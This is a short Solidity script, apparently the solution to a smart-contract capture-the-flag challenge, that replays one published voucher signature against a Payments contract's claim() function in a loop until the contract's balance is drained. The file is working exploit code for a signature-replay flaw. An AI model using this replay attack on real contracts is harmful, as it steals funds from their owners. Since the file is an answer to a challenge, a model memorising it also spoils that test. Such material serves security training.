// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "../Cheats.sol";
import "../../src/C4Permit.sol";

/// Signature replay: take the one published voucher and replay claim() until
/// the contract is drained.
contract SolveC4 is Script {
    function run() external {
        PaymentsSetup setup = PaymentsSetup(vm.envAddress("SETUP"));
        Payments p = setup.payments();
        address to = setup.voucherTo();
        uint256 amount = setup.voucherAmount();
        uint8 v = setup.sigV();
        bytes32 r = setup.sigR();
        bytes32 s = setup.sigS();

        uint256 count = address(p).balance / amount;
        vm.startBroadcast();
        for (uint256 i = 0; i < count; i++) {
            p.claim(to, amount, v, r, s);
        }
        vm.stopBroadcast();
    }
}
